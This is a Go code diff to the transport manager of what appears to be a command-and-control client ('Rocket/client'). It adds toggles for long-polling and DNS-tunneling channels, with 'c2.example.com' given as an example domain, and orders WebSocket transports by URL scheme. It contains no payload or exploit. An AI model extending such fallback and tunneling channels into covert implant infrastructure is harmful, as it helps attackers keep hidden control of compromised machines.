@@ -4,6 +4,8 @@ import (
 	"Rocket/client/common"
 	"context"
 	"errors"
+	"net/url"
+	"strings"
 	"time"
 )
 
@@ -48,12 +50,16 @@ type Config struct {
 	DNSDomain string // Domain for DNS tunneling (e.g., "c2.example.com")
 
 	// Long polling specific
+	LongPollEnabled bool
 	LongPollTimeout time.Duration
 	LongPollPath    string // e.g., "/api/poll"
 
 	// QUIC specific
 	QUICEnabled bool
 	QUICPort    int // e.g., 443
+
+	// DNS-specific toggle (DNS tunneling is extremely environment-specific)
+	DNSEnabled bool
 
 	// P2P specific (optional)
 	EnableP2P   bool
@@ -114,16 +120,33 @@ func NewManager(config *Config) *Manager {
 		m.transports = append(m.transports, p2p)
 	}
 
-	// Add transports in priority order
-	m.transports = append(m.transports, NewWebSocketTransport(false)) // WS (priority 10)
-	m.transports = append(m.transports, NewWebSocketTransport(true))  // WSS (priority 15)
+	// Add transports in priority order (prefer scheme-matching WebSocket first)
+	preferSecureWS := false
+	if config != nil && len(config.ServerURL) > 0 {
+		if u, err := url.Parse(config.ServerURL); err == nil {
+			preferSecureWS = strings.EqualFold(u.Scheme, "https")
+		}
+	}
+	if preferSecureWS {
+		// Prefer WSS first when ServerURL is HTTPS.
+		m.transports = append(m.transports, NewWebSocketTransportWithPriority(true, 10))  // WSS
+		m.transports = append(m.transports, NewWebSocketTransportWithPriority(false, 15)) // WS
+	} else {
+		// Prefer WS first for HTTP endpoints; fall back to WSS if the server supports it.
+		m.transports = append(m.transports, NewWebSocketTransportWithPriority(false, 10)) // WS
+		m.transports = append(m.transports, NewWebSocketTransportWithPriority(true, 15))  // WSS
+	}
 
-	if config.QUICEnabled {
+	if config != nil && config.QUICEnabled {
 		m.transports = append(m.transports, NewQUICTransport()) // QUIC (priority 20)
 	}
 
-	m.transports = append(m.transports, NewLongPollingTransport()) // Long Polling (priority 30)
-	m.transports = append(m.transports, NewDNSTransport())         // DNS (priority 40)
+	if config != nil && config.LongPollEnabled {
+		m.transports = append(m.transports, NewLongPollingTransport()) // Long Polling (priority 30)
+	}
+	if config != nil && config.DNSEnabled {
+		m.transports = append(m.transports, NewDNSTransport()) // DNS (priority 40)
+	}
 
 	// Sort transports by priority (already in order, but be explicit)
 	sortTransports(m.transports)
